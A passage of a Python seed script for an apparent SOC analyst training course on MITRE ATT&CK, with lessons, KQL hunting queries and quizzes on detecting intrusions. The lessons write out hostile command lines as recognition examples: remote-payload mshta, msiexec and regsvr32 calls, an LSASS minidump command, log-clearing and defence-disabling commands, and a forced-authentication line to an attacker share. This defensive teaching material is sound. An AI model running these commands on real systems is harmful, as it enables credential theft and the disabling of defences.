| *"Run-key value added pointing to %AppData%"* | **T1547.001** + likely **T1036.005** | Autostart persistence with masquerading path |
| *"Outbound to AnyDesk on workstation without ticket"* | **T1219** | Remote Access Software (RMM abuse) |

## Glossary

- **Tactic / Technique / Sub-technique / Procedure** — the four-tier hierarchy.
- **Sub-tech overhaul (mid-2020)** — when many parent techniques were split.
- **30-second / 3-minute / 30-minute cadences** — the L1's three reading modes.
- **Zero-second read** — the anti-pattern of accepting the alert's technique ID without verification.

## Further reading

- `attack.mitre.org/techniques/T1059/001/` — the worked example page.
- `mitre-attack.github.io/attack-navigator/` — the layered grid view.
- LOLBAS — `lolbas-project.github.io` — every signed Windows binary with abuse potential.
- GTFOBins — Linux equivalent.
""",
    )
    m8l1q = _add_lesson(
        session, mod8, order=2, title="Framework & technique pages — quiz",
        lesson_type=LessonType.QUIZ, duration_min=7,
        content_md="Three questions on the four-tier hierarchy, technique-page reading discipline, and mapping an alert artefact to technique IDs.",
    )
    _add_q(session, m8l1q, order=1, kind=QuestionKind.SINGLE,
        stem_md="In ATT&CK Enterprise's four-tier hierarchy, which level represents *a specific instance of a technique observed in real reporting*, e.g. *'Group X has used scheduled tasks for persistence'*?",
        options=[
            {"value": "tactic", "label": "Tactic"},
            {"value": "technique", "label": "Technique"},
            {"value": "subtech", "label": "Sub-technique"},
            {"value": "procedure", "label": "Procedure"},
        ],
        correct="procedure",
        explanation_md="Procedures are the named-instance level — `Group → Technique` or `Software → Technique` mappings drawn from public reporting. They are *evidence* of a technique, not classification, and cluster names rotate between vendors — so you cite the technique, not the procedure-author, in case metadata.",
        points=2,
    )
    _add_q(session, m8l1q, order=2, kind=QuestionKind.MULTI,
        stem_md="An alert fires with `process.parent.name = WINWORD.EXE`, `process.name = powershell.exe`, and `process.command_line = 'powershell.exe -nop -w hidden -enc SQBFAFgA...'`. Which technique IDs would a properly-tagged ION case carry?",
        options=[
            {"value": "t1059", "label": "T1059 (parent only — sub-tech omitted)"},
            {"value": "t1059_001", "label": "T1059.001 (PowerShell sub-tech)"},
            {"value": "t1027_010", "label": "T1027.010 (Command Obfuscation — for the `-enc` flag)"},
            {"value": "t1204_002", "label": "T1204.002 (User Execution: Malicious File — WINWORD parent)"},
            {"value": "t1003_001", "label": "T1003.001 (LSASS Memory)"},
        ],
        correct=["t1059_001", "t1027_010", "t1204_002"],
        explanation_md="The artefact specifies the PowerShell sub-tech (.001), the encoded-command flag (T1027.010 Command Obfuscation), and the WINWORD parent (T1204.002 User Execution: Malicious File). Citing the *parent only* (T1059) drops precision that matters downstream for matcher tier 3 and case similarity. T1003.001 is unrelated — there's no LSASS access in this artefact.",
        points=3,
    )
    _add_q(session, m8l1q, order=3, kind=QuestionKind.TRUEFALSE,
        stem_md="ATT&CK technique IDs are immutable across versions — once an ID is assigned, it never deprecates, merges, or renumbers.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="false",
        explanation_md="**False.** IDs are *sticky* but not immutable. A small set has been renumbered or merged — most notably during the mid-2020 sub-technique overhaul (v7) and a cloud-matrix reshuffle around v10. *If a cited ID doesn't render on attack.mitre.org, search by name — it may have been merged or relocated.*",
        points=2,
    )

    # Lesson 8.2 — Top techniques: IA + Execution + Persistence
    m8l2 = _add_lesson(
        session, mod8, order=3,
        title="Top techniques: Initial Access, Execution, and Persistence",
        lesson_type=LessonType.READING, duration_min=24,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Recognise the most-frequent **Initial Access** techniques an L1 sees — phishing, edge-vulnerability exploitation, valid-account abuse, external remote services, drive-by, trusted-relationship
> 2. Identify the **Execution** workhorses — `T1059` script interpreters, `T1204` user execution, `T1218` LOLBAS, scheduled tasks, services
> 3. Recognise the **Persistence** vectors — registry Run keys, services, scheduled tasks, account creation, account manipulation, DLL hijack/sideload, web shells, WMI subscriptions
> 4. Cite the canonical telemetry fingerprints (Sysmon EIDs, Windows Event IDs, Defender Advanced Hunting tables, ECS fields) for each technique
> 5. Use the LOLBAS / GTFOBins references when an unusual command-line for a signed binary appears

## Initial Access (TA0001)

### T1566 Phishing — already covered (Module 6)

Sub-techniques: **.001 Spearphishing Attachment**, **.002 Spearphishing Link**, **.003 Spearphishing via Service** (LinkedIn / Teams / Discord), **.004 Spearphishing Voice** (vishing). Module 6 covered the triage moves; here, recognise the technique-page lens.

### T1190 Exploit Public-Facing Application

Adversary exploits a vuln on an internet-facing service (web app, VPN concentrator, file-transfer appliance). Recent canonical examples — *flag inline that this list dates*:

- **Log4Shell (CVE-2021-44228)** — JNDI lookup in logged input.
- **MOVEit Transfer (CVE-2023-34362)** — SQLi → file theft.
- **Citrix Bleed (CVE-2023-4966)** — session-token disclosure on NetScaler/ADC.
- **Ivanti Connect Secure (CVE-2023-46805 / CVE-2024-21887)**.
- **Confluence / Outlook NTLM-leak / Fortinet SSL-VPN** — the reliable rotation.

**Fingerprint.** Outbound shell from a process that *should not* spawn shells — `w3wp.exe` on IIS, `httpd` on Linux, `java` on Tomcat. Classic detection: child of a web-server process with `whoami`, `cmd.exe /c`, or `bash -i`.

**ECS.** `process.parent.name = "w3wp.exe"`, `process.name in ("cmd.exe","powershell.exe","bash")`, `process.command_line` containing reconnaissance verbs.

**Cross-reference.** Always pivot to the **CISA KEV catalogue**. If the affected product / CVE is in KEV, treat as confirmed-exploitation pattern and escalate (Module 7).

### T1078 Valid Accounts

Stolen, leaked, or sprayed credentials used to log in legitimately. Sub-techniques: **.001 Default**, **.002 Domain**, **.003 Local**, **.004 Cloud**.

**Fingerprint.** Successful auth from anomalous source — geo, ASN, device fingerprint, time-of-day. Entra ID: sign-in risk = *high*; Defender for Identity: *Suspicious sign-in*.

**Telemetry.** EID 4624 with anomalous source IP; Entra `SignInLogs.RiskLevelDuringSignIn`; `SignInLogs.ResultType`. For .003 Local: EID 4624 LT2/LT10 from an unexpected workstation.

### T1133 External Remote Services

RDP / VPN / Citrix / SSH / RDWeb / RD Gateway exposed to the internet, accessed with valid (or weak) credentials.

**Fingerprint.** Successful RDP (LT10) from an external source IP; VPN concentrator log of new geo; SSH password auth where keys are policy. Pivot to user history: *first time this user has logged in from this geo / this device / this hour?*

### T1195 / T1199 / T1189 — recognise but rarely L1-triaged

- **T1195 Supply Chain Compromise** — software (.002), hardware, dependency confusion. Surfaces as a downstream alert (suspicious child process, beacon traffic).
- **T1199 Trusted Relationship** — partner / contractor / MSP-channel access. Hallmark: service-principal or B2B-guest sign-in performing privileged actions outside expected scope.
- **T1189 Drive-by Compromise** — browser exploit chain or fake-update lure (the *SocGholish* pattern — fake "Chrome update" delivering JS that runs `wscript`/`mshta`). Triage by parent-process tree: a script host child of a browser process is the giveaway.

## Execution (TA0002)

### T1059 Command and Scripting Interpreter — the workhorse

Sub-techniques most common in L1 queues: **.001 PowerShell**, **.003 Windows Command Shell**, **.005 Visual Basic** (`wscript`/`cscript` running `.vbs` or VBA macros), **.006 Python**, **.007 JavaScript**.

**Suspicious-PowerShell vocabulary** (memorise — these are the high-signal substrings):

- `-EncodedCommand` / `-enc` (followed by base64)
- `-ExecutionPolicy Bypass` / `-ep bypass`
- `-NoProfile` / `-nop`
- `-WindowStyle Hidden` / `-w hidden`
- `IEX` (`Invoke-Expression`)
- `DownloadString` / `DownloadFile` / `Net.WebClient`
- `FromBase64String`
- `Invoke-Mimikatz`, `Invoke-PSExec`, `Invoke-WMIExec`
- `[Reflection.Assembly]::Load`
- AMSI bypass strings: `AmsiUtils`, `amsiInitFailed`

KQL — encoded / suspicious PowerShell across the estate:

```kql
DeviceProcessEvents
| where Timestamp > ago(24h)
| where FileName =~ "powershell.exe" or FileName =~ "pwsh.exe"
| where ProcessCommandLine has_any ("-enc", "FromBase64String", "DownloadString", "IEX ", "Invoke-Expression", "amsi")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine
| order by Timestamp desc
```

### T1204 User Execution

**.001 Malicious Link**, **.002 Malicious File**. The Module-6 click-path joins ATT&CK here — user double-clicks the document/shortcut, macro/script executes, parent-process tree shows `WINWORD.EXE → cmd.exe → powershell.exe`. *"Suspicious child of WINWORD"* → almost always **T1204.002 → T1059.{001|003|005}**.

### T1218 System Binary Proxy Execution — *Living Off The Land*

A signed Microsoft binary used to execute arbitrary code, evading allow-listing. Common sub-techniques:

- **.001 Compiled HTML File (.chm)** — `hh.exe` opens an .hta-equivalent.
- **.003 CMSTP** — Connection Manager profile installer; abuses INF SCT scriptlets.
- **.005 Mshta** — `mshta.exe http://.../payload.hta`.
- **.007 Msiexec** — `msiexec /i http://.../x.msi /quiet`.
- **.010 Regsvr32** — `regsvr32 /s /u /n /i:http://.../x.sct scrobj.dll` (Squiblydoo).
- **.011 Rundll32** — `rundll32 javascript:"..."`.

Reference: the **LOLBAS** project (`lolbas-project.github.io`) catalogues every signed Windows binary with abuse potential, the technique IDs each maps to, and example invocations. **GTFOBins** is the Linux analogue. When you see an unusual command-line for a signed binary, LOLBAS first.

### T1053 Scheduled Task / Job

**.005 Scheduled Task** on Windows. Both *execution* and *persistence*.

- **Event IDs:** 4698 (Task Created), 4702 (Task Updated), 4700 (Task Enabled).
- **Sysmon:** EID 1 with parent `svchost.exe -k netsvcs` (the host of the Schedule service).
- **Command line:** `schtasks /create /tn "..." /tr "..." /sc minute /mo 1 /ru SYSTEM`.

### T1569 System Services

**.002 Service Execution** — PsExec class. SCM creates a service whose binary path is the payload, runs it as `LOCAL SYSTEM`, then deletes the service. **EID 7045** (service installed) + service-name pattern (random 16-char strings, or the literal `PSEXESVC`) is the canonical fingerprint.

### T1106 Native API & T1559 IPC

- **T1106 Native API** — direct calls into NT-level APIs (`NtCreateProcess`, `NtAllocateVirtualMemory`) bypassing higher-level wrappers. Rare to read directly, but EDR alerts naming *"direct syscall"* or *"Heaven's Gate"* are this.
- **T1559.001 Component Object Model** — `MMC20.Application.ExecuteShellCommand` for lateral COM execution.
- **T1559.002 Dynamic Data Exchange** — historic Office DDE-formula payload.

## Persistence (TA0003)

### T1547.001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

The most common autostart vector. Watched paths:

- `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` and `…\\RunOnce`
- `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`
- `%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup`

**Sysmon EID 13** (RegistryEvent — Value Set) is the primary signal. ECS: `registry.path`, `registry.value`.

### T1543.003 Create or Modify System Process: Windows Service

Service binary path points at the payload; survives reboot. **EID 7045**, **Sysmon EID 1** with parent `services.exe`.

### T1136 Create Account

- **.001 Local** — EID 4720 (User Account Created), 4732 (added to local group).
- **.002 Domain** — EID 4720 + 4728 on a DC.
- **.003 Cloud** — Entra `Add user` audit event; Microsoft Graph `Directory.ReadWrite.All` operations.

### T1098 Account Manipulation

- **.005 Device Registration** — the Module 6 AiTM finisher: attacker registers a rogue device into the victim's Entra tenant to satisfy compliant-device CA.
- **.003 Additional Cloud Roles** — assigning *Global Administrator* / *Privileged Role Administrator* to a captured account.
- **.001 Additional Cloud Credentials** — adding an OAuth client secret or certificate to a service principal (the BEC backdoor).

### T1574 Hijack Execution Flow

- **.001 DLL Search Order Hijacking** — drop a malicious `version.dll` next to a vulnerable signed exe; Windows resolves the DLL from the exe directory before `System32`.
- **.002 DLL Side-Loading** — same idea, carrier is a legitimate signed app (commonly abused signed binaries from AV / printer-utility / Cisco vendors).

### T1505.003 Server Software Component: Web Shell

JSP / ASPX / PHP shell uploaded to a web server (China Chopper, Behinder, AntSword). Fingerprint: web-server process spawning a shell child (T1190 telemetry); short POST requests to a `.aspx` filename never seen before.

### T1546.003 Event Triggered Execution: WMI Event Subscription

A `__FilterToConsumerBinding` that fires on a system event, running a script. Detection: WMI activity log (`Microsoft-Windows-WMI-Activity/Operational`, EIDs 5860–5861) plus `mofcomp` invocations.

## Glossary

- **LOLBAS / GTFOBins** — catalogues of signed binaries with abuse potential (Windows / Linux).
- **Run keys + Services + Scheduled Tasks + WMI** — the four most common Windows persistence surfaces.
- **EID 7045** — service installed; the canonical T1543.003 / T1569.002 signal.
- **EID 4698 / 4700 / 4702** — scheduled task created / enabled / updated.

## Further reading

- LOLBAS — `lolbas-project.github.io`.
- CISA KEV catalogue — `cisa.gov/known-exploited-vulnerabilities-catalog`.
- ATT&CK Navigator — `mitre-attack.github.io/attack-navigator/`.
""",
    )
    m8l2q = _add_lesson(
        session, mod8, order=4, title="IA + Execution + Persistence — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on T1190 fingerprints, suspicious-PowerShell vocabulary, T1218 LOLBAS recognition, and persistence event-IDs.",
    )
    _add_q(session, m8l2q, order=1, kind=QuestionKind.SINGLE,
        stem_md="An IIS server fires the alert *'Anomalous child process of w3wp.exe'* — the worker process for the OWA app pool has spawned `cmd.exe /c whoami & hostname`. Which ATT&CK technique most precisely fits the *root cause* of this signal?",
        options=[
            {"value": "t1059_003", "label": "T1059.003 — Windows Command Shell"},
            {"value": "t1078", "label": "T1078 — Valid Accounts"},
            {"value": "t1190", "label": "T1190 — Exploit Public-Facing Application"},
            {"value": "t1547_001", "label": "T1547.001 — Registry Run Keys"},
        ],
        correct="t1190",
        explanation_md="The `w3wp.exe` parent indicates web-application exploitation — T1190. The cmd shell child is T1059.003 *executed via* the T1190 foothold; both should be tagged on the case, but the *root* technique is T1190. Cross-reference the affected product / CVE against the CISA KEV catalogue and escalate per Module 7.",
        points=2,
    )
    _add_q(session, m8l2q, order=2, kind=QuestionKind.MULTI,
        stem_md="Which of the following PowerShell command-line substrings are reliable signals of suspicious activity worth elevating priority?",
        options=[
            {"value": "enc", "label": "`-EncodedCommand` or `-enc` followed by base64"},
            {"value": "wp", "label": "`Get-Process` and `Get-Service`"},
            {"value": "iex", "label": "`IEX (New-Object Net.WebClient).DownloadString(...)`"},
            {"value": "amsi", "label": "AMSI-bypass strings like `AmsiUtils` or `amsiInitFailed`"},
            {"value": "azc", "label": "`Get-AzContext` (Azure auth-context check)"},
        ],
        correct=["enc", "iex", "amsi"],
        explanation_md="Encoded commands, `IEX` + `DownloadString` chains, and AMSI-bypass strings are reliably suspicious. `Get-Process` / `Get-Service` are normal admin tooling; `Get-AzContext` is benign developer / DevOps activity. Recognising these false-positive flavours quickly is part of the L1 reflex.",
        points=3,
    )
    _add_q(session, m8l2q, order=3, kind=QuestionKind.SINGLE,
        stem_md="A Windows event with **EID 7045** appears showing a service installed with a random 16-character name pointing at a binary in `%TEMP%`. Which technique pair best fits?",
        options=[
            {"value": "t1547_t1078", "label": "T1547.001 (Registry Run Keys) + T1078 (Valid Accounts)"},
            {"value": "t1543_t1036", "label": "T1543.003 (Windows Service) + T1036.005 (Match Legitimate Name or Location)"},
            {"value": "t1053_t1003", "label": "T1053.005 (Scheduled Task) + T1003.001 (LSASS Memory)"},
            {"value": "t1190_t1505", "label": "T1190 + T1505.003 (Web Shell)"},
        ],
        correct="t1543_t1036",
        explanation_md="EID 7045 with a random service name from `%TEMP%` is the canonical T1543.003 (Windows Service persistence) fingerprint, with a masquerading element (T1036.005) because the binary lives outside its expected install path. Random-name + user-writable path + service-create is also the PsExec / T1569.002 pattern variant.",
        points=2,
    )
    _add_q(session, m8l2q, order=4, kind=QuestionKind.SHORTANSWER,
        stem_md="Name the project that catalogues every signed Microsoft Windows binary with abuse potential, the technique IDs each maps to, and example invocations — the L1's first reference when an unusual command-line for a signed binary appears.",
        options=None,
        correct=["lolbas", "LOLBAS", "lolbas-project", "lolbas project"],
        explanation_md="LOLBAS — *Living Off The Land Binaries, Scripts and Libraries* — at `lolbas-project.github.io`. Maps signed Windows binaries to ATT&CK technique IDs and example invocations. GTFOBins is the Linux analogue.",
        points=2,
    )

    # Lesson 8.3 — PrivEsc + Defense Evasion + Cred Access + Discovery
    m8l3 = _add_lesson(
        session, mod8, order=5,
        title="Privilege Escalation, Defense Evasion, Credential Access, and Discovery",
        lesson_type=LessonType.READING, duration_min=24,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Recognise the **Privilege Escalation** techniques an L1 sees most often — process injection variants, token manipulation, UAC bypass, kernel/driver exploitation
> 2. Identify **Defense Evasion** signals — obfuscation, log clearing, EDR/AV tampering, masquerading
> 3. Walk the **Credential Access** family — LSASS dumping, DCSync, Kerberoasting / AS-REP roasting, Pass-the-Hash, brute force, MFA fatigue
> 4. Recognise that **Discovery** is a *cluster signal*, not a single-command alert, and identify the post-foothold orientation pattern
> 5. Pivot from EID 4662 with the replication GUID to T1003.006 instantly

## Privilege Escalation (TA0004)

- **T1068 Exploitation for Privilege Escalation** — kernel/driver exploit, **BYOVD** (*Bring Your Own Vulnerable Driver* — `gmer`, `RTCore64`, `kdmapper`-loadable drivers). Loaded-driver evidence in **Sysmon EID 6** and the Code-Integrity log.
- **T1134 Access Token Manipulation** — **.001 Token Impersonation/Theft**, **.002 Create Process with Token**, **.005 SID-History Injection**.
- **T1055 Process Injection** — **.001 DLL Injection**, **.002 PE Injection**, **.003 Thread Execution Hijacking**, **.012 Process Hollowing**, **.004 APC**, **.011 EWMI**. EDR alerts are the primary surface. **Sysmon EID 8** (CreateRemoteThread) and **EID 10** (ProcessAccess with high granted-access) are the classical signals.
- **T1548.002 UAC Bypass** — `fodhelper.exe`, `eventvwr.exe`, `sdclt.exe` registry-hijack flavours.
- **T1078 Valid Accounts** — also privilege escalation when a low-priv account inherits admin rights through a misconfiguration.

**Common L1 mistake:** treating *every* T1055 alert as Privilege Escalation. T1055 is *primarily* defense evasion / process-context-cloak; it confers privilege only when injecting into a higher-integrity target. Look at source vs target integrity levels.

## Defense Evasion (TA0005)

### T1027 Obfuscated Files or Information

- **.002 Software Packing** — UPX or custom packers.
- **.006 HTML Smuggling** (Module 6) — JS-decoded blob constructed inside the browser.
- **.010 Command Obfuscation** — Invoke-Obfuscation patterns; `^` carets in cmd; `${var}` PowerShell tricks; concatenated strings; backtick-escapes.

### T1070 Indicator Removal

- **.001 Clear Windows Event Logs** — `wevtutil cl Security`; **EID 1102** (Security log cleared); EID 104 (System log cleared).
- **.003 Clear Command History** — `Clear-History`; deleting `ConsoleHost_history.txt`.
- **.004 File Deletion** — payload self-deletes on completion.
- **.006 Timestomp** — modifying file MAC times.

### T1562 Impair Defenses

- **.001 Disable or Modify Tools** — `sc stop Sense` (Defender for Endpoint sensor); `Set-MpPreference -DisableRealtimeMonitoring $true`; killing AV processes.
- **.002 Disable Windows Event Logging** — `Set-Service -Name EventLog -StartupType Disabled`; `Auditpol /set /category:* /success:disable /failure:disable`.
- **.004 Disable or Modify System Firewall** — `netsh advfirewall set allprofiles state off`.
- **.009 Safe Mode Boot** — boot into Safe Mode to bypass EDR (a documented ransomware affiliate move).

### T1036 Masquerading

- **.001 Invalid Code Signature** — payload signed with stolen / unauthorised cert, or self-signed posing as a known vendor.
- **.005 Match Legitimate Name or Location** — `svchost.exe` running from `%TEMP%`, `lsass.exe` running from `C:\\Users\\...`. The path is the giveaway, not the name.

### T1112 Modify Registry, T1140 Deobfuscate, T1497 Sandbox Evasion

- **T1112** — disabling LSA Protection, AMSI providers, WDigest credential caching settings.
- **T1140 Deobfuscate/Decode Files or Information** — small stager pulls a base64/AES-encrypted blob and decrypts in memory; AMSI-captured deobfuscated content is the visible artefact.
- **T1497 Virtualisation/Sandbox Evasion** — malware checks for VM artefacts (`vmtoolsd`, `vboxservice`) before executing payload.

## Credential Access (TA0006)

### T1003 OS Credential Dumping

- **.001 LSASS Memory** — Mimikatz, `procdump -ma lsass.exe`, the **comsvcs.exe minidump trick** (`rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <PID> lsass.dmp full`), `nanodump`, `pypykatz`. **Sysmon EID 10** (ProcessAccess) targeting `lsass.exe` with high granted-access (`0x1010` / `0x1F0FFF`) is *the* canonical fingerprint. Defender raises *"Suspicious access to LSASS"* alerts.
- **.002 Security Account Manager (SAM)** — `reg save HKLM\\SAM …` or VSS shadow copy.
- **.003 NTDS** — domain controller `ntds.dit` extraction (via VSS or `ntdsutil ifm`).
- **.006 DCSync** — abusing the AD replication API (`DRSUAPI`) to request password hashes for any account from a DC. **EID 4662** with the `DS-Replication-Get-Changes` GUID (`1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`) from a non-DC source is the canonical signal.
- **.008 /etc/passwd & /etc/shadow** — Linux credential dump.

KQL — LSASS access pattern:

```kql
DeviceEvents
| where Timestamp > ago(24h)
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| extend GrantedAccess = tostring(parse_json(AdditionalFields).GrantedAccess)
| where GrantedAccess in ("0x1010","0x1410","0x1438","0x143a","0x1f0fff","0x1fffff")
| where InitiatingProcessFileName !in ("MsMpEng.exe","SenseIR.exe","CSFalconService.exe","Sysmon.exe","WindowsDefender.exe")
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, GrantedAccess
| order by Timestamp desc
```

### T1110 Brute Force

- **.001 Password Guessing** — single account, many passwords.
- **.003 Password Spraying** — many accounts, few common passwords.
- **.004 Credential Stuffing** — leaked-creds reuse.

**Telemetry:** EID 4625 (failed logon) clusters; Entra `SignInLogs` with high failure ratio; *one success following many failures from same source* = compromised.

### T1555.003 Credentials from Web Browsers

`LaZagne`, `WebBrowserPassView`, infostealers (RedLine, Raccoon, Lumma) targeting Chrome's `Login Data` SQLite + DPAPI master key.

### T1539 Steal Web Session Cookie

The Module-6 AiTM payoff — cookies bypass MFA. Detection is downstream — the *use* of the cookie shows up as an Entra sign-in from a new device/IP.

### T1187 Forced Authentication

The Module-6 OPSEC trap: SMB-share UNC path or `.url` file with `IconFile=\\\\attacker\\share\\icon` causes the client to send NTLM hash to attacker. Catch with: outbound SMB (445) to non-trusted IP from a workstation.

### T1558 Steal or Forge Kerberos Tickets

- **.003 Kerberoasting** — request TGS for SPN-bearing accounts, crack offline. **EID 4769** with Ticket Encryption Type `0x17` (RC4-HMAC) when the environment policy is AES-only is the signal; high-volume 4769 from a single workstation against multiple SPNs is also classic.
- **.004 AS-REP Roasting** — accounts with *"Do not require Kerberos preauth"* flag set; **EID 4768** with preauth-not-required.
- **.001 Golden Ticket** — forged TGT signed with `krbtgt` hash.
- **.002 Silver Ticket** — forged TGS signed with the service-account hash.

### T1621 MFA Request Generation

Push-bombing (Module 6). Entra: many sign-in attempts with `ResultType` indicating MFA was challenged in rapid succession from the same IP.

## Discovery (TA0007) — the *cluster* signal

Discovery alone is rarely a single high-severity alert — `whoami` is run on legitimate workstations every day. **The cluster is the signal:** 5–10 discovery commands within a few minutes from one user, on one host, often at an unusual hour. The classic *post-foothold orientation* minute.

| Technique | Sub | Typical commands |
|---|---|---|
| **T1087** Account Discovery | .001 Local | `net user`, `net localgroup` |
| | .002 Domain | `net user /domain`, `Get-ADUser -Filter *` |
| **T1018** Remote System Discovery | — | `net view`, `arp -a`, `nltest /dclist:` |
| **T1083** File and Directory Discovery | — | `dir /s C:\\Users`, `tree`, `Get-ChildItem` |
| **T1057** Process Discovery | — | `tasklist`, `Get-Process` |
| **T1016** System Network Configuration | — | `ipconfig /all`, `route print`, `arp -a` |
| **T1033** System Owner/User | — | `whoami`, `query user` |
| **T1069** Permission Groups | .001 Local | `net localgroup administrators` |
| | .002 Domain | `net group "Domain Admins" /domain` |
| **T1482** Domain Trust Discovery | — | `nltest /domain_trusts`, `Get-DomainTrust` |
| **T1518** Software Discovery | .001 Security Software | `tasklist /v`, `Get-Service` |

KQL — discovery cluster within 5 minutes:

```kql
let discovery_cmds = dynamic(["whoami","net user","net group","net localgroup","nltest","ipconfig","tasklist","arp","systeminfo","quser"]);
DeviceProcessEvents
| where Timestamp > ago(24h)
| where ProcessCommandLine has_any (discovery_cmds)
| summarize cmds=make_set(ProcessCommandLine), count() by DeviceName, AccountName, bin(Timestamp, 5m)
| where count_ >= 4
| order by Timestamp desc
```

**Two opposite L1 mistakes to avoid:**

1. *"A single `whoami` is high-severity."* — it isn't; pivot for cluster.
2. *"This cluster is informational because it's just discovery."* — domain-trust + Domain-Admin enumeration from a workstation is a strong post-foothold signal regardless of volume.

## Glossary

- **BYOVD** — Bring Your Own Vulnerable Driver (T1068 / driver-loaded kernel exploit pattern).
- **EID 1102** — Security log cleared (T1070.001).
- **EID 4662 + replication GUID** — DCSync (T1003.006); from a non-DC source IP.
- **EID 4769 RC4** — Kerberoasting downgrade (T1558.003).
- **Discovery cluster** — multiple discovery verbs in a short window; the cluster *is* the signal.

## Further reading

- LOLBAS — `lolbas-project.github.io`.
- ATT&CK technique pages — `attack.mitre.org/techniques/`.
- MITRE Engenuity Center for Threat-Informed Defense — top-techniques calculator.
""",
    )
    m8l3q = _add_lesson(
        session, mod8, order=6, title="PrivEsc, Evasion, Cred, Discovery — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on T1003.006 fingerprint, Kerberoasting downgrade, the discovery-cluster pattern, and T1055 mis-classification.",
    )
    _add_q(session, m8l3q, order=1, kind=QuestionKind.SINGLE,
        stem_md="A domain controller logs **EID 4662** with `Object Type: domainDNS`, properties including `DS-Replication-Get-Changes-All`, sourced from a workstation IP. Which ATT&CK sub-technique does this *most precisely* match?",
        options=[
            {"value": "t1003_001", "label": "T1003.001 — LSASS Memory"},
            {"value": "t1003_003", "label": "T1003.003 — NTDS"},
            {"value": "t1003_006", "label": "T1003.006 — DCSync"},
            {"value": "t1558_001", "label": "T1558.001 — Golden Ticket"},
        ],
        correct="t1003_006",
        explanation_md="EID 4662 with the replication GUID family (`DS-Replication-Get-Changes` / `DS-Replication-Get-Changes-All`) sourced from a *non-DC* IP is the canonical DCSync (T1003.006) signal — abuse of the AD `DRSUAPI` replication API to request password hashes for any account, from a non-DC. *Page-everyone* alert.",
        points=2,
    )
    _add_q(session, m8l3q, order=2, kind=QuestionKind.MULTI,
        stem_md="Which of the following are reliable Windows-Event-ID fingerprints for the techniques listed?",
        options=[
            {"value": "1102_t1070", "label": "EID 1102 (Security log cleared) → T1070.001"},
            {"value": "4769_rc4", "label": "EID 4769 with TicketEncryptionType 0x17 (RC4-HMAC) when AES is policy → T1558.003 Kerberoasting"},
            {"value": "4768_preauth", "label": "EID 4768 with preauth-not-required → T1558.004 AS-REP Roasting"},
            {"value": "4624_lt2_t1003", "label": "EID 4624 LT2 (Interactive) → T1003.001 LSASS Memory"},
            {"value": "4720_t1136", "label": "EID 4720 (User account created) → T1136 Create Account"},
        ],
        correct=["1102_t1070", "4769_rc4", "4768_preauth", "4720_t1136"],
        explanation_md="EID 1102, 4769-with-RC4, 4768-with-no-preauth, and 4720 each map cleanly to the listed techniques. EID 4624 LT2 is interactive logon — *not* an LSASS-dumping signal; LSASS dumping is fingerprinted by Sysmon EID 10 ProcessAccess against `lsass.exe` with high granted-access masks.",
        points=3,
    )
    _add_q(session, m8l3q, order=3, kind=QuestionKind.TRUEFALSE,
        stem_md="A T1055 process-injection alert is, by default, a Privilege-Escalation event and should be tagged on the case as TA0004.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="false",
        explanation_md="**False.** T1055 is *primarily* a defense-evasion / process-context-cloak technique. It confers privilege only when injecting into a higher-integrity target — same-integrity injection is evasion, cross-integrity (medium → high or user → SYSTEM) is escalation. Look at source vs target integrity levels before tagging the tactic.",
        points=2,
    )
    _add_q(session, m8l3q, order=4, kind=QuestionKind.SINGLE,
        stem_md="On `WORKSTATION-7`, user `jsmith` runs `whoami`, `net group \"Domain Admins\" /domain`, `nltest /domain_trusts`, and `net view /domain` within 70 seconds at 09:14 UTC. What is the correct L1 reading?",
        options=[
            {"value": "info", "label": "Tag as 'T1033 informational'; close, since each command is benign in isolation"},
            {"value": "cluster", "label": "Treat as a high-confidence post-foothold *discovery cluster* (T1033 + T1069.002 + T1482 + T1018) and pivot for the parent process plus 30-min lateral-movement evidence"},
            {"value": "single", "label": "Open four separate cases, one per technique, and queue each independently"},
            {"value": "block", "label": "Block `nltest.exe` at the EDR and close"},
        ],
        correct="cluster",
        explanation_md="The cluster is the signal. A workstation user does not run `nltest /domain_trusts` and `net group \"Domain Admins\" /domain` in normal work — domain-trust + Domain-Admin enumeration in a 70-second window is the textbook first-minute-after-foothold orientation. Pivot 30 min before for parent process and 30 min after for T1003 / T1021. Per Module 7, escalate.",
        points=2,
    )

    # Lesson 8.4 — Lateral / Collection / Exfil / Impact / C2 + chains + scenarios + ION
    m8l4 = _add_lesson(
        session, mod8, order=7,
        title="Lateral Movement, Collection / Exfil / Impact, C2, the ransomware + cloud chains, worked scenarios, and ION conventions",
        lesson_type=LessonType.READING, duration_min=28,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Recognise the **Lateral Movement**, **Collection**, **Exfiltration**, **Impact**, and **C2** techniques an L1 sees most often, with their canonical telemetry pivots
> 2. Walk the modal **ransomware-affiliate intrusion chain** in ATT&CK shorthand, and recognise where dwell-time compression makes early-stage alerts urgent
> 3. Walk the modal **cloud-incident chain** (BEC → tenant takeover) and recognise the cloud-specific sub-techniques
> 4. Apply ION-specific conventions — matcher tier 3 / 4 use ATT&CK technique and tactic IDs; case-similarity uses technique tags
> 5. Walk three end-to-end worked scenarios — discovery cluster, LSASS → DCSync, ransomware staging — and reason about the next-likely step in each chain
> 6. Avoid the eight common L1 ATT&CK-mapping mistakes

## Lateral Movement (TA0008)

### T1021 Remote Services

- **.001 RDP** — Logon Type 10, port 3389. Detection: 4624 LT10 from a non-jumpbox source.
- **.002 SMB / Admin Shares** — ADMIN$, C$, IPC$. Logon Type 3 to admin shares from a non-server source.
